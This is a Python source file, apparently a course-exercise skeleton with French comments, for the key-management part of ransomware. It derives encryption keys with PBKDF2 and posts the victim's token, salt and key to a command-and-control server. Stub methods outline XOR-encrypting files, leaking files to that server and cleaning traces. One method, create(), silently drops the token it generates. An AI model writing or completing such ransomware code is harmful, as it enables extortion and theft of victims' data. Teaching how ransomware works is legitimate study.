from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile



class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None
        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        # Initialiser le KDF (Key Derivation Function) avec PBKDF2HMAC
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            
        )
        # Dérive la clé en utilisant le sel et la clé initiale
        derived_key = kdf.derive(key)
        return derived_key

    def create(self) -> Tuple[bytes, bytes, bytes]:
         # Générer un sel et une clé aléatoires en utilisant token_bytes
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        # Générer un token aléatoire
        token = secrets.token_bytes(self.TOKEN_LENGTH)
        # Dérive la clé en utilisant do_derivation
        derived_key = self.do_derivation(salt, key)
        return salt, key, derived_key

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        # Préparer les données à envoyer au CNC
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }

        # Envoyer les données au CNC en utilisant une requête POST
        response = requests.post(f'http://{self._remote_host_port}/new', json=data)

        # Vérifier si la réponse du CNC est un succès
        if response.status_code != 200 or response.json().get("status") != "OK":
            self._log.error("Failed to register the victim to the CNC")
            raise Exception("Failed to register the victim to the CNC")

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        raise NotImplemented()

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()
    

    